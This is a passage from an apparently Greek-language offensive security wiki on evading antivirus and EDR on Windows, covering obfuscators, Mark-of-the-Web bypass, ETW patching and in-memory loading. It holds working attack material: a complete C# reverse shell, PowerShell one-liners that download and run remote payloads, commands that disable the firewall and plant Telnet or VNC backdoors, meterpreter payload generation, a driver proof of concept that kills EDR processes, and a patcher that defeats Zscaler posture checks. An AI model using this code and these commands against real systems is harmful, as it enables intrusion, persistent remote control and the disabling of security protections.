ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Μετά από αυτό το βήμα θα πρέπει να βλέπετε κανονικές .NET API όπως `Convert.FromBase64String` ή `AES.Create()` αντί για αδιαφανείς wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – τρέξτε το προκύπτον δυαδικό κάτω από dnSpy, ψάξτε για μεγάλα Base64 blobs ή χρήση `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *πραγματικό* payload. Συχνά το malware το αποθηκεύει ως TLV-encoded byte array αρχικοποιημένο μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς** να χρειάζεται να τρέξετε το κακόβουλο δείγμα – χρήσιμο όταν δουλεύετε σε offline workstation.

> 🛈  Το ConfuserEx παράγει ένα custom attribute με όνομα `ConfusedByAttribute` που μπορεί να χρησιμοποιηθεί ως IOC για αυτόματη ταξινόμηση δειγμάτων.

#### Εντολή μιας γραμμής
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Στόχος αυτού του project είναι να παρέχει ένα open-source fork του [LLVM](http://www.llvm.org/) compilation suite ικανό να προσφέρει αυξημένη ασφάλεια λογισμικού μέσω code obfuscation και tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstates how to use `C++11/14` language to generate, at compile time, obfuscated code without using any external tool and without modifying the compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated operations που παράγονται από το C++ template metaprogramming framework, καθιστώντας τη ζωή όσου θέλει να crack-άρει την εφαρμογή λίγο πιο δύσκολη.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz είναι ένας x64 binary obfuscator ικανός να obfuscate διάφορα διαφορετικά pe αρχεία συμπεριλαμβανομένων: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame είναι ένα απλό metamorphic code engine για arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator είναι ένα fine-grained code obfuscation framework για LLVM-supported languages χρησιμοποιώντας ROP (return-oriented programming). ROPfuscator obfuscates ένα πρόγραμμα σε επίπεδο assembly code μετατρέποντας κανονικές εντολές σε ROP chains, αποδιοργανώνοντας την φυσική μας αντίληψη του κανονικού control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt είναι ένας .NET PE Crypter γραμμένος σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

## SmartScreen & MoTW

Ενδεχομένως να έχετε δει αυτή την οθόνη όταν κατεβάζετε κάποια executables από το διαδίκτυο και τα εκτελείτε.

Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφαλείας που στοχεύει στο να προστατεύει τον τελικό χρήστη από το να τρέξει ενδεχομένως κακόβουλες εφαρμογές.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen λειτουργεί κυρίως με μια reputation-based προσέγγιση, που σημαίνει ότι εφαρμογές που δεν κατεβαίνουν συχνά θα ενεργοποιούν το SmartScreen, ειδοποιώντας και αποτρέποντας τον τελικό χρήστη από το να εκτελέσει το αρχείο (αν και το αρχείο μπορεί ακόμα να εκτελεστεί κάνοντας κλικ στο More Info -> Run anyway).

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι εκτελέσιμα που είναι signed με ένα **trusted** signing certificate **won't trigger SmartScreen**.

Η πιο αποτελεσματική μέθοδος για να αποτρέψετε τα payloads σας από το να λάβουν το Mark of The Web είναι να τα πακετάρετε μέσα σε κάποιο container όπως ένα ISO. Αυτό συμβαίνει επειδή Mark-of-the-Web (MOTW) **cannot** να εφαρμοστεί σε **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που πακετάρει payloads σε output containers για να αποφύγει το Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Εδώ είναι ένα demo για την παράκαμψη του SmartScreen με τη συσκευασία payloads μέσα σε αρχεία ISO χρησιμοποιώντας [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής (logging) στα Windows που επιτρέπει σε εφαρμογές και συστατικά του συστήματος να **καταγράφουν γεγονότα**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφάλειας για να παρακολουθούν και να εντοπίζουν κακόβουλες δραστηριότητες.

Παρόμοια με το πώς το AMSI απενεργοποιείται (παρακαμπτείται), είναι επίσης δυνατό να κάνετε τη συνάρτηση **`EtwEventWrite`** μιας διαδικασίας user space να επιστρέφει άμεσα χωρίς να καταγράφει γεγονότα. Αυτό γίνεται με patching της συνάρτησης στη μνήμη ώστε να επιστρέφει αμέσως, ουσιαστικά απενεργοποιώντας την καταγραφή ETW για εκείνη τη διαδικασία.

Μπορείτε να βρείτε περισσότερες πληροφορίες στα **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/)** και **[https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Η φόρτωση C# binaries στη μνήμη είναι γνωστή εδώ και καιρό και παραμένει ένας πολύ καλός τρόπος για την εκτέλεση των post-exploitation εργαλείων χωρίς να εντοπίζεστε από AV.

Εφόσον το payload φορτώνεται απευθείας στη μνήμη χωρίς να αγγίζει το δίσκο, το μόνο που χρειάζεται να απασχολήσει είναι το patching του AMSI για ολόκληρη τη διεργασία.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, κ.λπ.) ήδη παρέχουν τη δυνατότητα να εκτελούν C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να το κάνετε:

- **Fork\&Run**

Αυτό περιλαμβάνει το **spawn ενός νέου θυσιαστικού process**, την έγχυση του post-exploitation κακόβουλου κώδικα σε εκείνη τη νέα διεργασία, την εκτέλεση του κακόβουλου κώδικα και όταν τελειώσει, τη δολοφονία της νέας διεργασίας. Αυτό έχει και πλεονεκτήματα και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση γίνεται **έξω από** την διαδικασία του Beacon implant. Αυτό σημαίνει ότι αν κάτι στην post-exploitation ενέργειά μας πάει στραβά ή εντοπιστεί, υπάρχει **πολύ μεγαλύτερη πιθανότητα** το **implant να επιβιώσει.** Το μειονέκτημα είναι ότι υπάρχει **μεγαλύτερη πιθανότητα** να εντοπιστούμε από **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Αφορά την έγχυση του post-exploitation κακόβουλου κώδικα **στο ίδιο του το process**. Με αυτόν τον τρόπο αποφεύγετε τη δημιουργία νέας διεργασίας και το σαρωμένο από AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά με την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon** καθώς μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα για το C# Assembly loading, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **από PowerShell**, δείτε [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το βίντεο του S3cur3th1sSh1t (https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελέσετε κακόβουλο κώδικα χρησιμοποιώντας άλλες γλώσσες δίνοντας στο συμβιβασμένο μηχάνημα πρόσβαση **στο interpreter environment εγκατεστημένο στον Attacker Controlled SMB share**.

Επιτρέποντας πρόσβαση στα Interpreter Binaries και στο περιβάλλον στο SMB share μπορείτε να **εκτελέσετε arbitrary code σε αυτές τις γλώσσες εντός της μνήμης** του συμβιβασμένου μηχανήματος.

Το repo αναφέρει: Defender εξακολουθεί να σαρώνει τα scripts αλλά με τη χρήση Go, Java, PHP κ.λπ. έχουμε **περισσότερη ευελιξία να παρακάμψουμε static signatures**. Δοκιμές με τυχαία μη-αποκρυπτογραφημένα reverse shell scripts σε αυτές τις γλώσσες έχουν αποδειχθεί επιτυχείς.

## TokenStomping

Το Token stomping είναι μια τεχνική που επιτρέπει σε έναν επιτιθέμενο να **χειριστεί το access token ή ένα security product όπως EDR ή AV**, επιτρέποντάς του να μειώσει τα προνόμια του ώστε η διεργασία να μην τερματιστεί αλλά να μην έχει δικαιώματα να ελέγξει για κακόβουλες ενέργειες.

Για να αποτραπεί αυτό, τα Windows θα μπορούσαν να **απαγορεύσουν σε εξωτερικές διεργασίες** να αποκτούν handles πάνω στα tokens διεργασιών ασφαλείας.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Όπως περιγράφεται σε [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο απλώς να αναπτύξετε το Chrome Remote Desktop στον υπολογιστή του θύματος και να το χρησιμοποιήσετε για να τον αναλάβετε και να διατηρήσετε persistence:
1. Κατεβάστε από https://remotedesktop.google.com/, κάντε κλικ στο "Set up via SSH", και μετά κάντε κλικ στο MSI αρχείο για Windows για να το κατεβάσετε.
2. Τρέξτε τον installer σιωπηλά στο θύμα (απαιτείται admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα Chrome Remote Desktop και κάντε κλικ στο επόμενο. Ο οδηγός θα σας ζητήσει να εξουσιοδοτήσετε· πατήστε το κουμπί Authorize για να συνεχίσετε.
4. Εκτελέστε την δοθείσα παράμετρο με κάποιες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Σημείωση: η παράμετρος pin επιτρέπει τον ορισμό του pin χωρίς χρήση GUI).


## Advanced Evasion

Η αποφυγή ανίχνευσης είναι ένα πολύπλοκο θέμα, μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές τηλεμετρίας σε ένα μόνο σύστημα, οπότε είναι σχεδόν αδύνατο να παραμείνετε εντελώς αόρατοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον που αντιμετωπίζετε θα έχει τα δικά του δυνατά και αδύνατα σημεία.

Συνιστώ ανεπιφύλακτα να δείτε αυτό το talk από [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια εικόνα για πιο Advanced Evasion τεχνικές.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτό είναι επίσης ένα εξαιρετικό talk από [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με το Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) το οποίο θα **αφαιρεί μέρη του binary** μέχρι να **βρει ποιο μέρος το Defender** θεωρεί κακόβουλο και να σας το επισημάνει.\
Ένα άλλο εργαλείο που κάνει το **ίδιο** είναι το [**avred**](https://github.com/dobin/avred) με μια ανοιχτή web υπηρεσία στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Έως τα Windows10, όλα τα Windows περιλάμβαναν έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως διαχειριστής) κάνοντας:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Κάντε το **να ξεκινάει** όταν το σύστημα ξεκινά και **τρέξτε** το τώρα:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Αλλαγή telnet port** (stealth) και απενεργοποίηση firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τα bin downloads, όχι το setup)

**ΣΤΟΝ HOST**: Εκτελέστε _**winvnc.exe**_ και διαμορφώστε τον server:

- Enable the option _Disable TrayIcon_
- Set a password in _VNC Password_
- Set a password in _View-Only Password_

Στη συνέχεια, μετακινήστε το binary _**winvnc.exe**_ και το **πρόσφατα** δημιουργημένο αρχείο _**UltraVNC.ini**_ μέσα στο **victim**

#### **Reverse connection**

Ο **attacker** πρέπει να εκτελέσει μέσα στον δικό του **host** το binary `vncviewer.exe -listen 5900` ώστε να είναι έτοιμος να συλλάβει μια reverse **VNC connection**. Έπειτα, στο **victim**: Ξεκινήστε το winvnc daemon `winvnc.exe -run` και τρέξτε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΣΟΧΗ:** Για να διατηρήσετε τη διακριτικότητα πρέπει να αποφύγετε τα παρακάτω

- Μην ξεκινήσετε `winvnc` αν τρέχει ήδη ή θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν τρέχει με `tasklist | findstr winvnc`
- Μην ξεκινάτε `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο φάκελο αλλιώς θα ανοίξει [το παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
- Μην τρέξετε `winvnc -h` για βοήθεια επειδή θα ενεργοποιήσει ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Μέσα στο GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Τώρα **εκκινήστε τον lister** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Ο τρέχων Defender θα τερματίσει τη διαδικασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Χρησιμοποιήστε το με:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# χρήση του compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα obfuscators για C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Παράδειγμα χρήσης python για build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Εξουδετέρωση AV/EDR από Kernel Space

Το Storm-2603 εκμεταλλεύτηκε ένα μικρό κονσολικό utility γνωστό ως **Antivirus Terminator** για να απενεργοποιήσει τις προστασίες endpoint πριν την ανάπτυξη ransomware. Το εργαλείο φέρνει τον δικό του **ευάλωτο αλλά *υπογεγραμμένο* driver** και τον καταχράται για να εκτελέσει προνομιούχες λειτουργίες kernel που ακόμη και οι υπηρεσίες AV σε Protected-Process-Light (PPL) δεν μπορούν να μπλοκάρουν.

Key take-aways
1. **Signed driver**: Το αρχείο που τοποθετείται στο δίσκο είναι `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το Antiy Labs’ “System In-Depth Analysis Toolkit”. Επειδή ο driver φέρει έγκυρη υπογραφή Microsoft, φορτώνει ακόμα και όταν το Driver-Signature-Enforcement (DSE) είναι ενεργοποιημένο.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Η πρώτη γραμμή καταχωρεί τον driver ως **kernel service** και η δεύτερη τον ξεκινάει ώστε το `\\.\ServiceMouse` να γίνει προσβάσιμο από το user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Τερματισμός μιας αυθαίρετης διεργασίας με PID (χρησιμοποιείται για να σκοτώσει υπηρεσίες Defender/EDR) |
| `0x990000D0` | Διαγραφή αυθαίρετου αρχείου στο δίσκο |
| `0x990001D0` | Απεγκατάσταση του driver και αφαίρεση της υπηρεσίας |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD παρακάμπτει εντελώς τις προστασίες σε user-mode· κώδικας που εκτελείται στο kernel μπορεί να ανοίξει *protected* processes, να τους κάνει terminate, ή να τροποποιήσει kernel objects ανεξαρτήτως PPL/PP, ELAM ή άλλων χαρακτηριστικών hardening.

Detection / Mitigation
•  Ενεργοποιήστε τη λίστα αποκλεισμού ευάλωτων drivers της Microsoft (`HVCI`, `Smart App Control`) ώστε τα Windows να αρνούνται να φορτώσουν το `AToolsKrnl64.sys`.  
•  Παρακολουθήστε τη δημιουργία νέων *kernel* services και ειδοποιήστε όταν ένας driver φορτώνεται από έναν world-writable κατάλογο ή δεν υπάρχει στην allow-list.  
•  Παρατηρήστε handles σε user-mode προς custom device objects που ακολουθούνται από ύποπτες κλήσεις `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Το Zscaler’s **Client Connector** εφαρμόζει κανόνες device-posture τοπικά και βασίζεται σε Windows RPC για να επικοινωνεί τα αποτελέσματα με άλλα components. Δύο αδύναμες σχεδιαστικές επιλογές επιτρέπουν μια πλήρη παράκαμψη:

1. Η αξιολόγηση posture γίνεται **αποκλειστικά client-side** (ένα boolean αποστέλλεται στον server).  
2. Τα εσωτερικά RPC endpoints ελέγχουν μόνο ότι το εκτελέσιμο που συνδέεται είναι **υπογεγραμμένο από Zscaler** (μέσω `WinVerifyTrust`).

Με το **patching τεσσάρων signed binaries στο δίσκο** και οι δύο μηχανισμοί μπορούν να αχρηστευτούν:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1` ώστε κάθε έλεγχος να θεωρείται compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | Γίνεται NOP ⇒ οποιαδήποτε (ακόμα και unsigned) process μπορεί να bind-άρει στα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαθίσταται με `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Συντομεύεται / παρακάμπτεται |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Αφού αντικαταστήσετε τα αρχικά αρχεία και επανεκκινήσετε τη στοίβα υπηρεσιών:

* **Όλοι** οι έλεγχοι κατάστασης εμφανίζονται **green/compliant**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο παραβιασμένος host αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο που ορίζεται από τις πολιτικές της Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς οι καθαρά client-side αποφάσεις εμπιστοσύνης και οι απλοί έλεγχοι υπογραφής μπορούν να παρακαμφθούν με λίγα byte patches.

## Κατάχρηση Protected Process Light (PPL) για να παραποιήσετε το AV/EDR με LOLBINs

Το Protected Process Light (PPL) επιβάλλει μια ιεραρχία signer/επιπέδου έτσι ώστε μόνο προστατευμένες διεργασίες με ίσο ή υψηλότερο επίπεδο να μπορούν να παραποιούν η μία την άλλη. Επιθετικά, αν μπορείτε νόμιμα να ξεκινήσετε ένα PPL-enabled binary και να ελέγξετε τα arguments του, μπορείτε να μετατρέψετε μια ακίνδυνη λειτουργικότητα (π.χ. logging) σε ένα περιορισμένο, PPL-υποστηριζόμενο write primitive προς προστατευμένους φακέλους που χρησιμοποιούνται από το AV/EDR.

Τι κάνει μια διεργασία να τρέχει ως PPL
- Το target EXE (και οποιαδήποτε φορτωμένα DLLs) πρέπει να είναι υπογεγραμμένα με ένα PPL-capable EKU.
- Η διεργασία πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τα flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί ένα συμβατό protection level που ταιριάζει με τον signer του binary (π.χ. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Λάθος επίπεδα θα αποτύχουν κατά τη δημιουργία.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
